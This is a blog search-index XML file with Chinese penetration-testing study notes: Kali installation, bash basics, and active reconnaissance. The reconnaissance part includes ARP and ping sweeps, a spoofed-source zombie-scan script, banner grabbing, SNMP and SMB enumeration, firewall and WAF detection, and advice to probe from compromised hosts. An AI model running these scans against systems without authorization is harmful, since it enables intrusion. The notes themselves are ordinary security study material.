<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Install</title>
      <link href="2021/03/21/Install/"/>
      <url>2021/03/21/Install/</url>
      
        <content type="html"><![CDATA[<p>kali基本工具的介绍以及安装过程</p><span id="more"></span><h1 id="硬盘安装"><a href="#硬盘安装" class="headerlink" title="硬盘安装"></a>硬盘安装</h1><ul><li>下载安装镜像  <a href="https://www.kali.org/download/">kali官网</a></li><li>验证 hash 值   ==&gt;  sha1sum</li><li>制作启动光盘  ==&gt;  live<ul><li>制作工具  <a href="http://unetbootin.github.io/">unetbootin</a></li></ul></li><li>设置BIOS启动顺序</li><li>启动安装</li></ul><h1 id="DOCKER"><a href="#DOCKER" class="headerlink" title="DOCKER"></a>DOCKER</h1><ul><li>虚拟化和Docker</li><li>Kali Docker image<ul><li><a href="https://www.kali.org/news/official-kali-linux-docker-images/">https://www.kali.org/news/official-kali-linux-docker-images/</a></li><li><a href="https://github.com/offensive-security/kali-linux-docker">https://github.com/offensive-security/kali-linux-docker</a></li></ul></li><li><a href="https://cloud.tencent.com/developer/article/1554958">Kali+Docker参考</a></li><li><a href="https://www.jianshu.com/p/3a339072ca7d">Windows下安装Docker</a></li></ul><h1 id="虚拟机安装"><a href="#虚拟机安装" class="headerlink" title="虚拟机安装"></a>虚拟机安装</h1><ul><li>官方VM镜像<ul><li><a href="https://www.offensive-security.com/kali-linux-vmware-arm-image-download">https://www.offensive-security.com/kali-linux-vmware-arm-image-download</a></li></ul></li><li>vmware workstation</li><li>Virtual Box<ul><li>download, insatll, extension, using</li><li>win8系统，必须卸载 kb3045999</li><li>安装kali</li><li>安装tools</li></ul></li></ul><h1 id="持久加密USB安装"><a href="#持久加密USB安装" class="headerlink" title="持久加密USB安装"></a>持久加密USB安装</h1><ul><li><p>LUKS：Linux Unified Key Setup</p><ul><li>磁盘分区加密规范</li><li>不依赖于操作系统的磁盘级加密</li></ul></li><li><p>将镜像刻录到U盘</p><ul><li>dd if=kali-linux-1.1.0-amd64.iso of=/dev/sdb bs=1M    # bs代表每次复制的大小</li></ul></li><li><p>为U盘创建额外分区</p><ul><li><p>parted 磁盘分区工具</p><pre><code>print devicesprintmkpart primary start endquit</code></pre></li></ul></li><li><p>使用LUKS加密分区</p><ul><li><p>前端 cryptsetup</p><pre><code>cryptsetup --verbose --verify-passphrase luksFormat /dev/sdb3...</code></pre></li></ul></li><li><p>打开加密分区</p><pre><code>cryptysetup luksOpen /dev/sdb3 usb</code></pre></li><li><p>格式化加密分区+卷标</p><pre><code>mkfs.ext4 /dev/mapper/usbe2label /dev/mapper/usb persistence</code></pre></li><li><p>挂载加密分区</p><pre><code>mount /dev/mapper/usb /mnt/usb/echo &quot;/ union&quot; &gt; /mnt/usb/persistence.conf</code></pre></li><li><p>结束操作</p><pre><code>umount /dev/mapper/usbcryptsetup luksClose /dev/mapper/usb</code></pre></li></ul><h1 id="熟悉环境"><a href="#熟悉环境" class="headerlink" title="熟悉环境"></a>熟悉环境</h1><ul><li><p>登录密码</p></li><li><p>Top 10 安全工具</p><pre><code>aircrack-ngburpsuitehydrajohnmaltegometasploit frameworknmapowasp-zap sqlmapwireshark</code></pre></li><li><p>字体调整</p><pre><code>gnome-tweak-tool</code></pre></li><li><p>监视网络流量</p></li><li><p>文件目录</p></li><li><p>共享文件</p></li></ul><h1 id="熟悉BASH命令"><a href="#熟悉BASH命令" class="headerlink" title="熟悉BASH命令"></a>熟悉BASH命令</h1><pre><code class="shell">ls  # 列出当前目录 -l 详细 -a 列出隐藏文件 -h human  --sort=size/time  以size or time排序cd  # 更改目录pwd  # 查看当前目录cat  # 显示文件内容more  # 逐屏显示文本内容  similar command: lesstail  # 默认显示最下面10行  -number 显示最下面 number lines     watch -n 2 tail -20 /var/log/messagecp  # copy files  -r copy directoryrm  # delete filestop  # 查看系统进程或者杀死进程  键入k，输入PIDps  # -ef 查看详细进程信息  -aux grep  # 筛选输出内容 grep &quot;string&quot; fileegrep  # grep升级版  -v 排除某些字符串awk  # 对输出内容分块，默认为空格  awk &#39;&#123;print $5&#125;&#39;  输出第五块的内容 -F:  选择以:为间隔分割字符cut  # 对内容分块  -d &#39;:&#39; 指定分块的间隔符  -f 1  显示第一个分块sort  # 排序uniq  # 去重seq 1 3 # 序列ifconfig  # ifconfig eth0 down / upmacchanger  # -m 00:11:11:11:11:11 eth0  修改网卡mac地址netstat  # -pantu  查看网络连接信息route  # 添加，删除路由信息mount  # mount -o loop kali.iso /media/cdrom    # -o options 主要用来描述设备或档案的挂接方式。    # loop：用来把一个文件当成硬盘分区挂接上系统     # ro：采用只读方式挂接设备     # rw：采用读写方式挂接设备     # iocharset：指定访问文件系统所用字符集dmesg  # 直接显示日志信息find  # find / -name nmap  查找nmap   -iname 忽略大小写  -exec 执行其他bash命令whereis  # 在数据库中查找 -b 查找二进制文件    # 先使用updatedb更新数据库echo  # 输出  -n 不换行输出vi / vim  # 文本编辑mtr IP  # Mytraceroute  查看当前路由信息dhclient eth0   # 强制使网卡重新获得IP地址dpkg -L firece   # 列出与某个程序有关的所有目录</code></pre><ul><li><p>/etc/resolv.conf  当前计算机的dns配置文件</p></li><li><p>|  管道命令 </p><pre><code class="bash">netstat -pantu | egrep -v &#39;0.0.0.0|:::&#39; | awk &#39;&#123;print $5&#125;&#39; | egrep -v &#39;and|Address&#39; | cut -d &#39;:&#39; -f 1 | sort | uniq &gt; ip</code></pre></li><li><p>bash 脚本</p><pre><code class="bash">#!/bin/bashecho -n &quot;IP: &quot;read ipecho &quot;your ip is :&quot; $ip</code></pre><pre><code class="bash">#!/bin/bashfor n in `seq 9`dofor m in `seq $n`doecho -n &quot;$n*$m&quot;=`expr $m \* $n` &quot; &quot;doneechodone</code></pre></li></ul>]]></content>
      
      
      <categories>
          
          <category> KALI </category>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tag1 </tag>
            
            <tag> tag2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>主动信息收集</title>
      <link href="2021/03/21/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>2021/03/21/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h1 id="主动信息收集"><a href="#主动信息收集" class="headerlink" title="主动信息收集"></a>主动信息收集</h1><ul><li>直接与目标系统交互通信</li><li>无法避免留下访问的痕迹</li><li>使用受控的第三方电脑进行探测<ul><li>使用代理或已经被控制的主机</li><li>做好被封杀的准备</li><li>使用噪声迷惑目标，淹没真实的探测流量</li></ul></li><li>扫描<ul><li>发送不同的探测，返回结果判断目标状态</li></ul></li></ul><h1 id="发现"><a href="#发现" class="headerlink" title="发现"></a>发现</h1><ul><li>识别活着的主机（攻击目标）</li><li>输出IP地址列表</li><li>2、3、4 层发现</li></ul><h2 id="二层发现"><a href="#二层发现" class="headerlink" title="二层发现"></a>二层发现</h2><ul><li>优点：扫描速度快、可靠</li><li>缺点：不可路由</li><li>ARP协议<ul><li>抓包</li></ul></li></ul><h3 id="Arping"><a href="#Arping" class="headerlink" title="Arping"></a>Arping</h3><pre><code class="shell">arping 1.1.1.1 -c 1arping 1.1.1.1 -d   # 发现arp欺骗arping 192.168.1.2 -c 1 | grep &quot;bytes from&quot; | cut -d &quot; &quot; -f 5 | cut -d &quot;(&quot; -f 2 | cut -d &quot;)&quot; -f 1</code></pre><pre><code class="shell">#!/bin/bashif [ &quot;$#&quot; -ne 1 ]then     echo &quot;Usage: ./arping.sh [interface]&quot;    echo &quot;Example: ./arping.sh eth0&quot;    echo &quot;Example will perform an ARP scan of the local subnet to which etho is assigned&quot;    exit fi  interface=$1 prefix=$(ifconfig $interface | grep &#39;inet &#39; | awk &#39;&#123;print $2&#125;&#39; | cut -d &#39;.&#39; -f 1-3) for i in $(seq 1 254) do       arping $prefix.$i -c 1 | grep &quot;bytes from&quot; | cut -d &quot; &quot; -f 5 | cut -d &quot;(&quot; -f 2 | cut -d &quot;)&quot; -f 1 done</code></pre><pre><code class="shell">#!/bin/bashif [ &quot;$#&quot; -ne 1 ]then     echo &quot;Usage: ./arping.sh [file]&quot;    echo &quot;Example: ./arping.sh target.txt&quot;    echo &quot;Example will perform an ARP scan of the IP address which in the target.txt&quot;    exit fi  file=$1 for i in $(cat $file) do       arping $i -c 1 | grep &quot;bytes from&quot; | cut -d &quot; &quot; -f 5 | cut -d &quot;(&quot; -f 2 | cut -d &quot;)&quot; -f 1 done</code></pre><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><pre><code class="shell">nmap -sn 1.1.1.0/24nmap -sn 1.1.1.1-254nmap -iL target.txt -sn </code></pre><h3 id="Netdiscover"><a href="#Netdiscover" class="headerlink" title="Netdiscover"></a>Netdiscover</h3><ul><li><p>专用于二层发现</p></li><li><p>可用于无线交换网络</p></li><li><p>主动和被动探测</p></li><li><p>主动</p><pre><code class="shell">netdiscover -i eth0 -r 1.1.1.0/24netdiscover -i target.txt</code></pre></li><li><p> 被动：主动 arp 容易触发报警</p></li></ul><pre><code class="shell">netdiscover -p</code></pre><h3 id="Scapy"><a href="#Scapy" class="headerlink" title="Scapy"></a>Scapy</h3><ul><li>作为Python库进行调用</li><li>也可作为单独的工具使用</li><li>抓包、分析、创建、修改、注入网络流量</li></ul><pre><code class="shell"># 相关组件apt-get install python-gnuplot# 相关函数ARP().display()sr1()</code></pre><pre><code class="python">#!/usr/bin/python3import loggingimport subprocesslogging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)from scapy.all import *if len(sys.argv) != 2:    print(&quot;Usage: ./scapy-arp.sh [interface]&quot;)    print(&quot;Example: ./scapy-arp.sh eth0&quot;)    print(&quot;Example will perform an ARP scan of the local subnet to which etho is assigned&quot;)    sys.exit()   interface = str(sys.argv[1])prefix = str(subprocess.check_output(&quot;ifconfig &quot; + interface + &quot; | grep &#39;inet &#39; | awk &#39;&#123;print $2&#125;&#39; | cut -d &#39;.&#39; -f 1-3&quot;, shell=True).strip()).split(&#39;\&#39;&#39;)[1]for i in range(1,254):    answer = sr1(ARP(pdst=prefix+&#39;.&#39;+str(i)), timeout=0.1, verbose=0)    if answer == None:        pass    else:        print(prefix+&#39;.&#39;+str(i))</code></pre><h2 id="三层发现"><a href="#三层发现" class="headerlink" title="三层发现"></a>三层发现</h2><ul><li>优点：可路由，速度较快</li><li>缺点：速度比二层慢，经常被边界防火墙过滤</li><li>IP、ICMP协议</li></ul><pre><code class="shell">ping 1.1.1.1 -c 2ping -R 1.1.1.1  /  traceroute 1.1.1.1ping 1.1.1.1 -c 1 | grep &quot;bytes from&quot; | cut -d &quot; &quot; -f 4 | cut -d &quot;:&quot; -f 1scapy-ping.pynmap 8.8.8.8 -snfping -g 8.8.8.1/24 -c 1hping3 8.8.8.8 --icmp -c 1</code></pre><h2 id="四层发现"><a href="#四层发现" class="headerlink" title="四层发现"></a>四层发现</h2><ul><li>优点：可路由，结果可靠，不被防火墙过滤，可以发现所有端口被过滤的主机</li><li>缺点：基于状态过滤的防火墙可过滤，全端口扫描速度慢</li><li>TCP：<ul><li>未经请求的 ACK —- RST</li><li>SYN —- SYN/ACK、RST</li></ul></li><li>UDP：<ul><li>ICMP端口不可达</li></ul></li></ul><pre><code class="shell"># ACK -- TCP  Port -- RST# scapy:answer = sr1(IP(dst=&quot;8.8.8.8&quot;)/TCP(flags=&quot;A&quot;, dport=80), timeout=1)int(answer[TCP].flags) = 4  (R)# nmapnmap 1.1.1.1-254 -PU 53 -snnmap 1.1.1.1-254 -PA 80 -sn# hping3hping3 --udp 1.1.1.1 -c 1hping3 1.1.1.1 -c 1# hping3 TCP 发包 Flag清0# Flag 0  ---  ACK、RST</code></pre><h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><ul><li>端口对应网络服务及应用端程序</li><li>服务端程序的漏洞通过端口攻入</li><li>发现更开放的端口</li><li>更具体的攻击面</li></ul><h2 id="UDP端口扫描"><a href="#UDP端口扫描" class="headerlink" title="UDP端口扫描"></a>UDP端口扫描</h2><ul><li>ICMP port-unreachable 响应代表端口关闭</li></ul><pre><code class="shell"># Scapy UDP Scansr1(IP(dst=&quot;1.1.1.1&quot;)/UDP(dport=port), timeout=5, verbose=0)# Nmapnmap -sU 1.1.1.1</code></pre><h2 id="TCP端口扫描"><a href="#TCP端口扫描" class="headerlink" title="TCP端口扫描"></a>TCP端口扫描</h2><ul><li><p>基于连接的协议</p></li><li><p>三次握手</p></li><li><p>隐蔽扫描  –  SYN</p><ul><li>不建立完整连接</li><li>应用日志不记录扫描行为 – 隐蔽</li></ul></li></ul><pre><code class="shell"># SYN -- SYN /ACK  or  RST# Scapysr1(IP(dst=&quot;1.1.1.1&quot;)/TCP(flags=&quot;S&quot;, dport=80), timeout=1, verbose=1)# flags: SA  or RA# nmapnmap -sS 1.1.1.1 -p 1-100 --open# hping3hping3 1.1.1.1 --scan 0-65535 -Shping3 -c 10 -S -spoof 1.1.1.2 -p ++1 1.1.1.3</code></pre><ul><li><p>僵尸扫描</p><ul><li>极度隐蔽</li><li>实施条件苛刻</li><li>可伪造源地址</li><li>选择僵尸机  ==&gt;  闲置系统 + 系统使用递增的IPID</li></ul></li></ul><pre><code class="shell"># Scapyi = IP()t = TCP()rt = (i/t)rz = (i/t)rz[IP].dst = &quot;192.168.1.7&quot;rz[TCP].dport = 445rz[TCP].flags = &quot;SA&quot;rt[IP].src = &quot;192.168.1.7&quot;rt[IP].dst = &quot;192.168.1.8&quot;rt[TCP].dport = 25re[TCP].flags = &quot;S&quot;az1 = sr1(rz)at=sr1(rt, timeout=1)az2 = sr1(rz)</code></pre><p><strong>Zombie port scan.py</strong></p><pre><code class="python">#!/usr/bin/python3from scapy.all import *import sysdef ipid(zombie):    # Test    reply1 = sr1(IP(dst=zombie)/TCP(flags=&quot;SA&quot;), timeout=2, verbose=0)    send(IP(dst=zombie)/TCP(flags=&quot;SA&quot;), verbose=0)    reply2 = sr1(IP(dst=zombie)/TCP(flags=&quot;SA&quot;), timeout=2, verbose=0)    if reply1[IP].id == (reply2[IP].id-2) :        print(&quot;OK&quot;)        response = input(&quot;Do you want to use this zombie to perform a scan? (Y/N)&quot;)        if response == &quot;Y&quot; or &quot;y&quot;:            target = input(&quot;Enter the IP address of the target system: &quot;)            zombiescan(target, zombie)            def zombiescan(target, zombie):    print(&quot;\nScanning target &quot; + target + &quot; with zombie &quot; + zombie + &quot;\n&quot;)    for port in range(1,100):        try:            start_val = sr1(IP(dst=zombie)/TCP(flags=&quot;SA&quot;, dport=port), timeout=2, verbose=0)            send(IP(src=zombie, dst=target)/TCP(flags=&quot;S&quot;, dport=port), verbose=0)            end_val = sr1(IP(dst=zombie)/TCP(flags=&quot;SA&quot;, dport=port), timeout=2, verbose=0)            if end_val[IP].id == (start_val[IP].id+2):                print(port)        except Exception:            passif __name__ == &quot;__main__&quot;:    zombie = input(&quot;Enter IP address to test IPID sequence: &quot;)    ipid(zombie) </code></pre><pre><code class="shell"># nmapnmap -p 445 192.168.1.7 --script=ipidseq.nse   # 判断僵尸机nmap 192.168.1.8 -p 0-100 -sI 192.168.1.7 -Pn  # 僵尸扫描</code></pre><ul><li>全连接端口扫描</li></ul><pre><code class="shell"># Scapyiptables -A OUTPUT -p tcp --tcp-flags RST RST -d 192.168.1.2 -j DROPsr1(IP(dst=&quot;1.1.1.1&quot;)/TCP(flags=&quot;S&quot;, dport=53), timeout=1, verbose=1)sr1(IP(dst=&quot;1.1.1.1&quot;)/TCP(flags=&quot;A&quot;, ack=(response[TCP].seq+1), dport=53), timeout=1, verbose=1)# Nmapnmap -sT 192.168.1.8 -p 1-100# dmitrydmitry -p 1.1.1.1# ncnc -nv -w 1 -z 1.1.1.1 53</code></pre><h1 id="服务扫描"><a href="#服务扫描" class="headerlink" title="服务扫描"></a>服务扫描</h1><ul><li><p>识别开放端口上运行的应用</p></li><li><p>识别目标操作系统</p></li><li><p>提高攻击效率</p><ul><li>Banner捕获</li><li>服务识别</li><li>操作系统识别</li><li>SNMP分析</li><li>防火墙识别</li></ul></li><li><p>Banner</p><ul><li>软件开发商</li><li>软件名称</li><li>服务类型</li><li>版本号  ==&gt; 直接发现已知的漏洞和弱点</li></ul></li><li><p>建立连接后直接获取Banner</p></li><li><p>另类服务识别方法：</p><ul><li>特征行为和响应字段</li><li>不同的响应可用于识别底层操作系统</li></ul></li><li><p>SNMP</p><ul><li>简单网络管理协议</li><li>Community strings</li><li>信息查询或重新配置</li></ul></li><li><p>识别和绕过防火墙筛选</p></li></ul><p><strong>Banner Scan</strong></p><pre><code class="shell"># ncnc -nv 192.168.1.8 22# dmitrydmitry -pb 192.168.1.8# nmapnmap -sT 1.1.1.1 -p 1-100 --script=banner.nse# amapamap -B 1.1.1.1 1-65535 | grep on</code></pre><pre><code class="python">#!/usr/bin/python3# Python socket# Socket 模块用于连接网络服务import socketimport selectimport sysif len(sys.argv) != 4:    print(&quot;Usage ./banner_grab.py [Target_iIP] &#123;First port&#125; [Last port]&quot;)    sys.exit()ip = sys.argv[1]start = int(sys.argv[2])end = int(sys.argv[3])for port in range(start, end):    try:        bangrab = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        bangrab.connect((ip, port))        ready = select.select([bangrab], [], [], 1)        if ready[0]:            print(&quot;TCP Port &quot; + str(port) + &quot; - &quot; + bangrab.recv(4096).decode())            bangrab.close()    except Exception:        pass</code></pre><p><strong>服务识别</strong></p><pre><code class="shell"># nmap 响应特征分析识别服务 # 发送系列复杂的探测和依据响应特征signaturenmap 1.1.1.1 -p 80 -sV# amapamap 1.1.1.1 1-100 -qampa 1.1.1.1 1-100 -qb# 使用nc手动判断nc -nv 1.1.1.1 80</code></pre><h1 id="操作系统识别"><a href="#操作系统识别" class="headerlink" title="操作系统识别"></a>操作系统识别</h1><ul><li>操作系统识别技术<ul><li>种类繁多</li><li>好产品采用多种技术组合</li></ul></li><li>TTL起始值<ul><li>Windows：128（65 - 128）</li><li>Linux / Unix：64（1 - 64）</li><li>某些Unix：255</li></ul></li></ul><pre><code class="python">#!/usr/bin/python3# ttl值判断from scapy.all import *import sysif len(sys.argv) != 2:    print(&quot;Usage: ./os_ttl.py [Target]&quot;)    sys.exit()ip = sys.argv[1]ans = sr1(IP(dst=str(ip))/ICMP(), timeout=1, verbose=0)if ans == None:    print(&quot;No response&quot;)elif int(ans[IP].ttl) &lt;= 64:    print(&quot;Linux&quot;)else:    print(&quot;Windows&quot;)</code></pre><pre><code class="shell"># nmapnmap -O 1.1.1.1# xprobe2  有误差xprobe2 1.1.1.1# p0f  被动扫描p0f</code></pre><ul><li>被动操作系统识别<ul><li>IDS</li><li>抓包分析</li></ul></li><li>被动扫描<ul><li><strong>p0f</strong></li><li>对包进行抓取分析</li><li>结合ARP地址欺骗识别全网OS</li></ul></li></ul><h1 id="SNMP"><a href="#SNMP" class="headerlink" title="SNMP"></a>SNMP</h1><ul><li><p>snmp (简单网络管理协议)</p><ul><li><p>UDP  S: 161  C: 162</p></li><li><p>信息的金矿</p></li><li><p>经常被错误配置</p></li><li><p>public / private / manager</p></li></ul></li><li><p>安装 SNMP 服务</p><ul><li>Windows：Win+R appwiz.cpl 添加服务组件</li></ul></li><li><p>MIB Tree</p><ul><li>SNMP Management information Base (MIB)</li><li>树形的网络设备管理功能数据库</li><li>1.3.6.1.4.1.77.1.2.25</li></ul></li></ul><pre><code class="shell"># onesixtyoneonesixtyone 1.1.1.1 publiconesixtyone -c dict.txt -i hosts -o my.log -w 100# snmpwalksnmpwalk 1.1.1.1 -c public -v 2csnmpwalk -c public -v 2c 1.1.1.1 1.3.6.1.4.1.77.1.2.25# snmpcheck 不好用snmpcheck 1.1.1.1</code></pre><h1 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h1><ul><li>Server Message Block 协议<ul><li>实现复杂</li><li>默认开发</li><li>文件共享</li><li>空会话无身份认证访问（SMB1）<ul><li>密码策略</li><li>用户名</li><li>组名</li><li>机器号</li><li>用户名、组SID</li></ul></li></ul></li></ul><pre><code class="shell"># nmapnmap -v -p 139,445 192.168.1.0/24 --opennmap 192.168.1.8 -p 139,445 --script=smb-os-discovery.nse# nbtscan# 可以跨网段扫描MAC地址nbtscan -r 192.168.1.0/24# enum4linuxenum4linux -a 192.168.1.8</code></pre><h1 id="SMTP"><a href="#SMTP" class="headerlink" title="SMTP"></a>SMTP</h1><pre><code class="shell"># nc nc -nv 1.1.1.1 25# VERY root# nampnmap smtp.163.com -p 25 --script=smtp-enum-users.nse --script-args=smtp-enum-users.methods=&#123;VRFY&#125;nmap smtp.163.com -p 25 --script=smtp-open-relay.nse</code></pre><h1 id="防火墙扫描"><a href="#防火墙扫描" class="headerlink" title="防火墙扫描"></a>防火墙扫描</h1><ul><li>通过检查回包，可能识别端口是否经过防火墙过滤</li></ul><table><thead><tr><th>Send</th><th>Response</th><th>Send</th><th>Response</th><th>Type</th></tr></thead><tbody><tr><td>SYN</td><td>No</td><td>ACK</td><td>RST</td><td>Filtered</td></tr><tr><td>SYN</td><td>SYN+ACK / SYN + RST</td><td>ACK</td><td>No</td><td>Filtered</td></tr><tr><td>SYN</td><td>SYN+ACK / SYN + RST</td><td>ACK</td><td>RST</td><td>Unfiltered / Open</td></tr><tr><td>SYN</td><td>No</td><td>ACK</td><td>No</td><td>Closed</td></tr></tbody></table><p><strong>Scapy</strong></p><pre><code class="python">#!/usr/bin/python3import sysfrom scapy.all import *if len(sys.argv) != 3:    print(&quot;Usage ./firewall_detect.py 1.1.1.1 80&quot;)    sys.exit()    ip = sys.argv[1]port = int(sys.argv[2])ACK_response = sr1(IP(dst=ip)/TCP(dport=port, flags=&#39;A&#39;), timeout=1, verbose=0)SYN_response = sr1(IP(dst=ip)/TCP(dport=port, flags=&#39;S&#39;), timeout=1, verbose=0)if (ACK_response == None) and (SYN_response == None):    print(&quot;Closed&quot;)elif (SYN_response == None) and (int(ACK_response[TCP].flags) == 4):    print(&quot;Filtered&quot;)elif (int(SYN_response[TCP].flags) == 18 or 20):    print(&quot;Filtered&quot;)else:    print(&quot;Open&quot;)</code></pre><pre><code class="shell"># Nmapnmap -sA 1.1.1.1 -p 22</code></pre><h1 id="负载均衡识别"><a href="#负载均衡识别" class="headerlink" title="负载均衡识别"></a>负载均衡识别</h1><ul><li>广域网负载均衡<ul><li>DNS</li></ul></li></ul><pre><code class="shell"># lbdlbd www.baidu.com</code></pre><h1 id="WAF-识别"><a href="#WAF-识别" class="headerlink" title="WAF 识别"></a>WAF 识别</h1><ul><li>WEB应用防火墙</li></ul><pre><code class="shell"># wafw00fwafw00f -lwafw00f http://www.microsoft.com# nmapnmap www.baidu.com --script=http-waf-detect.nse</code></pre><h1 id="Nmap-1"><a href="#Nmap-1" class="headerlink" title="Nmap"></a>Nmap</h1><pre><code>root@kali:~/Script/infor_detection# nmapNmap 7.80 ( https://nmap.org )                                                                                                                       Usage: nmap [Scan Type(s)] [Options] &#123;target specification&#125;                                                                                     TARGET SPECIFICATION:                                                                                                                             Can pass hostnames, IP addresses, networks, etc.  Ex: scanme.nmap.org, microsoft.com/24, 192.168.0.1; 10.0.0-255.1-254                                                                                 -iL &lt;inputfilename&gt;: Input from list of hosts/networks                                                                                           -iR &lt;num hosts&gt;: Choose random targets                                                                                                           --exclude &lt;host1[,host2][,host3],...&gt;: Exclude hosts/networks                                                                                   --excludefile &lt;exclude_file&gt;: Exclude list from file                                                                                                                                                                   HOST DISCOVERY:                                                                                                                                   -sL: List Scan - simply list targets to scan                                                                                                     -sn: Ping Scan - disable port scan                                                                                                               -Pn: Treat all hosts as online -- skip host discovery                                                                                           -PS/PA/PU/PY[portlist]: TCP SYN/ACK, UDP or SCTP discovery to given ports                                                                                                                                             -PE/PP/PM: ICMP echo, timestamp, and netmask request discovery probes                                                                           -PO[protocol list]: IP Protocol Ping                                                                                                             -n/-R: Never do DNS resolution/Always resolve [default: sometimes]                                                                               --dns-servers &lt;serv1[,serv2],...&gt;: Specify custom DNS servers                                                                                   --system-dns: Use OS&#39;s DNS resolver                                                                                                             --traceroute: Trace hop path to each host                                                                                                       SCAN TECHNIQUES:                                                                                                                                   -sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans                                                                                       -sU: UDP Scan                                                                                                                                   -sN/sF/sX: TCP Null, FIN, and Xmas scans                                                                                                         --scanflags &lt;flags&gt;: Customize TCP scan flags                                                                                                   -sI &lt;zombie host[:probeport]&gt;: Idle scan                                                                                                         -sY/sZ: SCTP INIT/COOKIE-ECHO scans                                                                                                             -sO: IP protocol scan                                                                                                                           -b &lt;FTP relay host&gt;: FTP bounce scan                                                                                                           PORT SPECIFICATION AND SCAN ORDER:                                                                                                                 -p &lt;port ranges&gt;: Only scan specified ports                                                                                                       Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9                                                                                   --exclude-ports &lt;port ranges&gt;: Exclude the specified ports from scanning                                                                                                                                           -F: Fast mode - Scan fewer ports than the default scan                                                                                           -r: Scan ports consecutively - don&#39;t randomize                                                                                                   --top-ports &lt;number&gt;: Scan &lt;number&gt; most common ports                                                                                           --port-ratio &lt;ratio&gt;: Scan ports more common than &lt;ratio&gt;                                                                                                                                                             SERVICE/VERSION DETECTION:                                                                                                                         -sV: Probe open ports to determine service/version info                                                                                         --version-intensity &lt;level&gt;: Set from 0 (light) to 9 (try all probes)                                                                           --version-light: Limit to most likely probes (intensity 2)                                                                                       --version-all: Try every single probe (intensity 9)                                                                                             --version-trace: Show detailed version scan activity (for debugging)                                                                                                                                                   SCRIPT SCAN:                                                                                                                                       -sC: equivalent to --script=default                                                                                                             --script=&lt;Lua scripts&gt;: &lt;Lua scripts&gt; is a comma separated list of           directories, script-files or script-categories             --script-args=&lt;n1=v1,[n2=v2,...]&gt;: provide arguments to scripts    --script-args-file=filename: provide NSE script args in a file    --script-trace: Show all data sent and received    --script-updatedb: Update the script database.    --script-help=&lt;Lua scripts&gt;: Show help about scripts.           &lt;Lua scripts&gt; is a comma-separated list of script-files or           script-categories.                      OS DETECTION:  -O: Enable OS detection    --osscan-limit: Limit OS detection to promising targets    --osscan-guess: Guess OS more aggressively    TIMING AND PERFORMANCE:  Options which take &lt;time&gt; are in seconds, or append &#39;ms&#39; (milliseconds),  &#39;s&#39; (seconds), &#39;m&#39; (minutes), or &#39;h&#39; (hours) to the value (e.g. 30m).    -T&lt;0-5&gt;: Set timing template (higher is faster)    --min-hostgroup/max-hostgroup &lt;size&gt;: Parallel host scan group sizes    --min-parallelism/max-parallelism &lt;numprobes&gt;: Probe parallelization    --min-rtt-timeout/max-rtt-timeout/initial-rtt-timeout &lt;time&gt;:     Specifies      probe round trip time.    --max-retries &lt;tries&gt;: Caps number of port scan probe retransmissions.    --host-timeout &lt;time&gt;: Give up on target after this long    --scan-delay/--max-scan-delay &lt;time&gt;: Adjust delay between probes    --min-rate &lt;number&gt;: Send packets no slower than &lt;number&gt; per second    --max-rate &lt;number&gt;: Send packets no faster than &lt;number&gt; per second    FIREWALL/IDS EVASION AND SPOOFING:    -f; --mtu &lt;val&gt;: fragment packets (optionally w/given MTU)    -D &lt;decoy1,decoy2[,ME],...&gt;: Cloak a scan with decoys    -S &lt;IP_Address&gt;: Spoof source address    -e &lt;iface&gt;: Use specified interface    -g/--source-port &lt;portnum&gt;: Use given port number    --proxies &lt;url1,[url2],...&gt;: Relay connections through HTTP/SOCKS4  proxies    --data &lt;hex string&gt;: Append a custom payload to sent packets    --data-string &lt;string&gt;: Append a custom ASCII string to sent packets    --data-length &lt;num&gt;: Append random data to sent packets    --ip-options &lt;options&gt;: Send packets with specified ip options    --ttl &lt;val&gt;: Set IP time-to-live field    --spoof-mac &lt;mac address/prefix/vendor name&gt;: Spoof your MAC address    --badsum: Send packets with a bogus TCP/UDP/SCTP checksum    OUTPUT:    -oN/-oX/-oS/-oG &lt;file&gt;: Output scan in normal, XML, s|&lt;rIpt kIddi3,     and Grepable format, respectively, to the given filename.    -oA &lt;basename&gt;: Output in the three major formats at once    -v: Increase verbosity level (use -vv or more for greater effect)    -d: Increase debugging level (use -dd or more for greater effect)    --reason: Display the reason a port is in a particular state    --open: Only show open (or possibly open) ports    --packet-trace: Show all packets sent and received    --iflist: Print host interfaces and routes (for debugging)    --append-output: Append to rather than clobber specified output files    --resume &lt;filename&gt;: Resume an aborted scan    --stylesheet &lt;path/URL&gt;: XSL stylesheet to transform XML output to  HTML    --webxml: Reference stylesheet from Nmap.Org for more portable XML    --no-stylesheet: Prevent associating of XSL stylesheet w/XML output    MISC:    -6: Enable IPv6 scanning    -A: Enable OS detection, version detection, script scanning, and  traceroute    --datadir &lt;dirname&gt;: Specify custom Nmap data file location    --send-eth/--send-ip: Send using raw ethernet frames or IP packets    --privileged: Assume that the user is fully privileged    --unprivileged: Assume the user lacks raw socket privileges    -V: Print version number    -h: Print this help summary page.EXAMPLES:    nmap -v -A scanme.nmap.org    nmap -v -sn 192.168.0.0/16 10.0.0.0/8    nmap -v -iR 10000 -Pn -p 80</code></pre>]]></content>
      
      
      <categories>
          
          <category> Information </category>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 主动 </tag>
            
            <tag> 收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>介绍</title>
      <link href="2021/03/21/kali%E4%BB%8B%E7%BB%8D/"/>
      <url>2021/03/21/kali%E4%BB%8B%E7%BB%8D/</url>
      
